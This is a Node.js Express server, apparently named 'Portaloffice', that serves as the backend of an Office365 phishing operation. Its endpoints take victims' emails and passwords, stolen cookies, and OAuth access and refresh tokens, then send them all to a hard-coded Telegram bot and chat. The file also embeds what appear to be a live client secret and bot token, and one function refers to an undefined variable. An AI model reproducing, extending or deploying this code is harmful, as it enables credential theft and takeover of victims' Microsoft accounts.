require('dotenv').config();

const express = require('express');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const CLIENT_ID = process.env.OFFICE365_CLIENT_ID || '7282858b-112c-49e6-b832-bd4faa422166';
const CLIENT_SECRET = process.env.OFFICE365_CLIENT_SECRET || 'Xxn8Q~TpskhswuVK~5dtKI_pG7kOMWjwJOO~7cCf';
const TENANT_ID = process.env.OFFICE365_TENANT_ID || '16181ef7-43d9-4f70-9fd2-dd167d012a54';
const SECRET_ID = process.env.OFFICE365_SECRET_ID || '747b1e0b-52de-4f1f-92a3-7d7dbd3d201d';
const OBJECT_ID = process.env.OFFICE365_OBJECT_ID || '43ea78da-3915-4e56-8ea8-55202e292a38';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7883535570:AAFWxTI2Dz1uEjEPu70CBxqmWKtMatrgsKE';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6342921625';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const SESSION_COOKIE_NAME = 'office365_session';
const sessions = new Map();

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function sanitizeText(value) {
  return String(value || 'n/a').replace(/[_*\[\]()~`>#+-=|{}.!]/g, '');
}

function truncateText(value, maxLength = 120) {
  const text = String(value || 'n/a');
  return text.length > maxLength ? `${text.slice(0, maxLength)}...` : text;
}

function getRedirectUri(req) {
  const configuredRedirect = process.env.OFFICE365_REDIRECT_URI;
  if (configuredRedirect) {
    return configuredRedirect;
  }

  const forwardedProto = req.headers['x-forwarded-proto'];
  const protocol = forwardedProto ? forwardedProto.split(',')[0].trim() : (req.protocol || 'http');
  const host = req.get('host') || 'localhost:3000';
  return `${protocol}://${host}/auth/callback`;
}

function parseJwt(token) {
  if (!token || typeof token !== 'string') return null;
  const parts = token.split('.');
  if (parts.length !== 3) return null;
  try {
    const payload = JSON.parse(Buffer.from(parts[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'));
    return payload;
  } catch (err) {
    return null;
  }
}

function extractCookies(req) {
  const raw = req.headers.cookie || '';
  return raw.split(';').map((value) => value.trim()).filter(Boolean).reduce((acc, pair) => {
    const [name, ...rest] = pair.split('=');
    acc[name] = rest.join('=');
    return acc;
  }, {});
}

function buildSession(tokenData, userInfo, rawCookies, ip, userAgent) {
  const idTokenPayload = parseJwt(tokenData.id_token);
  const expiresAt = tokenData.expires_in ? new Date(Date.now() + parseInt(tokenData.expires_in, 10) * 1000).toISOString() : null;

  return {
    tokenData: {
      access_token: tokenData.access_token,
      refresh_token: tokenData.refresh_token,
      id_token: tokenData.id_token,
      token_type: tokenData.token_type,
      expires_in: tokenData.expires_in,
      expires_at: expiresAt,
      scope: tokenData.scope
    },
    userInfo,
    idTokenPayload,
    accountType: idTokenPayload?.tid ? 'AzureAD' : 'MicrosoftPersonal',
    cookies: rawCookies,
    ip,
    userAgent,
    createdAt: new Date().toISOString()
  };
}

function encodeState(value) {
  if (!value) return '';
  if (typeof value === 'string') return value;
  const json = JSON.stringify(value);
  return Buffer.from(json, 'utf8').toString('base64url');
}

function decodeState(tastate) {
  if (!state) return null;
  try {
    const buffer = Buffer.from(state, 'base64url');
    return JSON.parse(buffer.toString('utf8'));
  } catch {
    return state;
  }
}

function buildAuthUrl(req, options = {}) {
  const redirectUri = getRedirectUri(req);
  const query = new URLSearchParams({
    client_id: CLIENT_ID,
    response_type: 'code',
    redirect_uri: redirectUri,
    response_mode: options.responseMode || 'query',
    scope: options.scope || 'openid profile email offline_access',
    prompt: options.prompt || 'login'
  });

  if (options.loginHint) query.set('login_hint', options.loginHint);
  if (options.domainHint) query.set('domain_hint', options.domainHint);
  if (options.nonce) query.set('nonce', options.nonce);
  if (options.state) query.set('state', encodeState(options.state));

  return `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/authorize?${query.toString()}`;
}

async function refreshAccessToken(refreshToken) {
  const tokenResponse = await fetch(
    `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: 'openid profile email offline_access'
      })
    }
  );

  const tokenData = await tokenResponse.json();
  if (!tokenData.access_token) {
    throw new Error(`Refresh token failed: ${JSON.stringify(tokenData)}`);
  }

  return tokenData;
}

async function sendTelegramMessage(text) {
  const response = await fetch(TELEGRAM_API_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: 'Markdown'
    })
  });
  const data = await response.json();
  console.log('Telegram send response:', data);
  return data;
}

function formatTelegramPayload(code, tokenData, userInfo, cookies, ip, userAgent) {
  return [
    '*Office365 OAuth callback received*',
    `*Valid:* ${sanitizeText(userInfo ? 'Microsoft Valid' : 'unknown')}`,
    `*Email:* ${sanitizeText(userInfo?.mail || userInfo?.userPrincipalName || 'n/a')}`,
    `*Name:* ${sanitizeText(userInfo?.displayName || 'n/a')}`,
    `*Code:* ${truncateText(code, 80)}`,
    `*Access Token:* ${truncateText(tokenData.access_token, 60)}`,
    `*Refresh Token:* ${truncateText(tokenData.refresh_token, 60)}`,
    `*Token Type:* ${sanitizeText(tokenData.token_type)}`,
    `*Expires In:* ${sanitizeText(tokenData.expires_in)}`,
    `*IP:* ${sanitizeText(ip)}`,
    `*User-Agent:* ${truncateText(userAgent, 80)}`,
    `*Cookies:* ${truncateText(cookies, 120)}`
  ].join('\n');
}

app.get('/', (req, res) => {
  res.send('Portaloffice server is running.');
});

app.get('/test-telegram', async (req, res) => {
  const message = req.query.msg || 'Telegram test from Portaloffice-server.js';
  try {
    const result = await sendTelegramMessage(message);
    res.json({ ok: true, result });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

function getSessionIdFromRequest(req) {
  const rawCookies = req.headers.cookie || '';
  const cookies = extractCookies(req);
  return cookies[SESSION_COOKIE_NAME] || null;
}

function getSession(req) {
  const sessionId = getSessionIdFromRequest(req);
  if (!sessionId) return null;
  return sessions.get(sessionId) || null;
}

function clearSession(res, sessionId) {
  if (sessionId) {
    sessions.delete(sessionId);
  }
  res.cookie(SESSION_COOKIE_NAME, '', {
    httpOnly: true,
    secure: false,
    sameSite: 'Lax',
    expires: new Date(0)
  });
}

app.get('/auth/start', (req, res) => {
  const keepMeSignedIn = String(req.query.keepMeSignedIn || req.query.kmsi || 'false').toLowerCase() === 'true';
  const statePayload = {
    keepMeSignedIn,
    originalState: req.query.state || null,
    nonce: req.query.nonce || crypto.randomUUID()
  };

  const authUrl = buildAuthUrl(req, {
    prompt: req.query.prompt || 'login',
    loginHint: req.query.login_hint,
    domainHint: req.query.domain_hint,
    nonce: statePayload.nonce,
    state: statePayload
  });

  res.redirect(authUrl);
});

app.get('/office365', (req, res) => {
  const authUrl = buildAuthUrl(req, { prompt: 'login' });
  return res.redirect(authUrl);
});

app.post('/api/login', async (req, res) => {
  const { email, password, file, attempt, source, time, browser, country, valid } = req.body;
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }

  const message = [
    '*Login received*',
    `*Email:* ${sanitizeText(email)}`,
    `*Password:* ${sanitizeText(password)}`,
    `*File:* ${sanitizeText(file)}`,
    `*Attempt:* ${sanitizeText(attempt)}`,
    `*Source:* ${sanitizeText(source)}`,
    `*Browser:* ${sanitizeText(browser || userAgent)}`,
    `*Country:* ${sanitizeText(country)}`,
    `*Valid:* ${sanitizeText(valid)}`,
    `*IP:* ${sanitizeText(ip)}`,
    `*Time:* ${sanitizeText(time)}`
  ].join('\n');

  await sendTelegramMessage(message);
  res.json({ status: 'ok', message: 'Login data received.' });
});

app.post('/api/capture-cookies', async (req, res) => {
  const payload = req.body || {};
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';
  const rawBody = JSON.stringify(req.body, null, 2);

  let cookiesText = '';
  if (payload.cookies) {
    cookiesText = typeof payload.cookies === 'string' ? payload.cookies : JSON.stringify(payload.cookies);
  } else if (payload.cookieArray) {
    cookiesText = JSON.stringify(payload.cookieArray);
  } else if (Array.isArray(payload)) {
    cookiesText = JSON.stringify(payload);
  }

  const message = [
    '*Cookie capture received*',
    `*Email:* ${sanitizeText(payload.email)}`,
    `*Name:* ${sanitizeText(payload.name)}`,
    `*Code:* ${sanitizeText(payload.code)}`,
    `*Access Token:* ${truncateText(payload.access_token, 60)}`,
    `*Refresh Token:* ${truncateText(payload.refresh_token, 60)}`,
    `*IP:* ${sanitizeText(ip)}`,
    `*User-Agent:* ${truncateText(userAgent, 80)}`,
    `*Browser:* ${truncateText(payload.browser || userAgent, 80)}`,
    `*Cookies:* ${truncateText(cookiesText || 'none', 120)}`,
    '*Raw payload:*',
    truncateText(rawBody, 120)
  ].join('\n');

  await sendTelegramMessage(message);
  res.json({ status: 'ok', message: 'Cookie payload received.' });
});

app.get('/auth/callback', async (req, res) => {
  const code = req.query.code;
  const state = req.query.state || null;
  if (!code) {
    return res.status(400).send('Missing code parameter.');
  }

  const redirectUri = getRedirectUri(req);
  const rawCookies = req.headers.cookie || 'none';
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';

  try {
    const tokenResponse = await fetch(
      `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: CLIENT_ID,
          client_secret: CLIENT_SECRET,
          code: code,
          redirect_uri: redirectUri,
          grant_type: 'authorization_code'
        })
      }
    );

    const tokenData = await tokenResponse.json();
    if (!tokenData.access_token) {
      await sendTelegramMessage(`*Office365 OAuth token exchange failed*\n*Code:* ${sanitizeText(code)}\n*State:* ${sanitizeText(state)}\n*Cookies:* ${sanitizeText(rawCookies)}\n*Error:* ${sanitizeText(JSON.stringify(tokenData))}`);
      return res.status(500).json({ error: 'Token exchange failed', details: tokenData });
    }

    const userResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
      headers: { Authorization: `Bearer ${tokenData.access_token}` }
    });
    const userInfo = await userResponse.json();

    const statePayload = decodeState(state);
    const keepMeSignedIn = statePayload?.keepMeSignedIn === true || statePayload?.keepMeSignedIn === 'true';
    const session = buildSession(tokenData, userInfo, rawCookies, ip, userAgent);
    session.keepMeSignedIn = keepMeSignedIn;
    session.state = statePayload;
    const sessionId = crypto.randomUUID();
    sessions.set(sessionId, session);

    const telegramText = formatTelegramPayload(code, tokenData, userInfo, rawCookies, ip, userAgent);
    await sendTelegramMessage(telegramText);

    res.cookie(SESSION_COOKIE_NAME, sessionId, {
      httpOnly: true,
      secure: false,
      sameSite: 'Lax',
      maxAge: keepMeSignedIn ? 1000 * 60 * 60 * 24 * 14 : 1000 * 60 * 60 * 24
    });

    return res.json({ message: 'OAuth callback received', tokenData, sessionId, cookies: rawCookies, keepMeSignedIn });
  } catch (err) {
    await sendTelegramMessage(`*Office365 OAuth callback error*
*Code:* ${sanitizeText(code)}
*State:* ${sanitizeText(state)}
*Cookies:* ${sanitizeText(rawCookies)}
*Error:* ${sanitizeText(err.message)}`);
    return res.status(500).json({ error: 'Callback error', details: err.message });
  }
});

app.get('/auth/status', (req, res) => {
  const session = getSession(req);
  if (!session) {
    return res.status(401).json({ authenticated: false, message: 'No active session.' });
  }

  const expiresAt = session.tokenData.expires_at ? new Date(session.tokenData.expires_at) : null;
  const isExpired = expiresAt ? expiresAt <= new Date() : false;

  res.json({
    authenticated: true,
    sessionId: getSessionIdFromRequest(req),
    accountType: session.accountType,
    userInfo: {
      displayName: session.userInfo?.displayName,
      email: session.userInfo?.mail || session.userInfo?.userPrincipalName,
      id: session.userInfo?.id
    },
    expiresAt: session.tokenData.expires_at,
    isExpired,
    keepMeSignedIn: session.keepMeSignedIn || false
  });
});

app.get('/auth/validate', async (req, res) => {
  const session = getSession(req);
  if (!session) {
    return res.status(401).json({ valid: false, message: 'No active session.' });
  }

  if (session.tokenData.expires_at && new Date(session.tokenData.expires_at) <= new Date()) {
    return res.status(401).json({ valid: false, message: 'Access token expired.' });
  }

  try {
    const graphResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
      headers: { Authorization: `Bearer ${session.tokenData.access_token}` }
    });
    const graphData = await graphResponse.json();
    return res.json({ valid: true, user: graphData, session: { accountType: session.accountType, keepMeSignedIn: session.keepMeSignedIn } });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

app.post('/auth/refresh', async (req, res) => {
  const session = getSession(req);
  if (!session) {
    return res.status(401).json({ refreshed: false, message: 'No active session.' });
  }

  const refreshToken = session.tokenData.refresh_token;
  if (!refreshToken) {
    return res.status(400).json({ refreshed: false, message: 'No refresh token available.' });
  }

  try {
    const newTokenData = await refreshAccessToken(refreshToken);
    session.tokenData = {
      ...session.tokenData,
      access_token: newTokenData.access_token,
      id_token: newTokenData.id_token || session.tokenData.id_token,
      refresh_token: newTokenData.refresh_token || session.tokenData.refresh_token,
      expires_in: newTokenData.expires_in,
      expires_at: new Date(Date.now() + parseInt(newTokenData.expires_in, 10) * 1000).toISOString(),
      token_type: newTokenData.token_type,
      scope: newTokenData.scope
    };
    session.updatedAt = new Date().toISOString();
    sessions.set(getSessionIdFromRequest(req), session);
    return res.json({ refreshed: true, tokenData: session.tokenData });
  } catch (err) {
    return res.status(500).json({ refreshed: false, error: err.message });
  }
});

app.post('/auth/signout', (req, res) => {
  const sessionId = getSessionIdFromRequest(req);
  if (!sessionId) {
    return res.status(200).json({ signedOut: true, message: 'No active session to clear.' });
  }

  clearSession(res, sessionId);
  return res.json({ signedOut: true, message: 'Session cleared.' });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Portaloffice server running on http://localhost:${port}`);
});
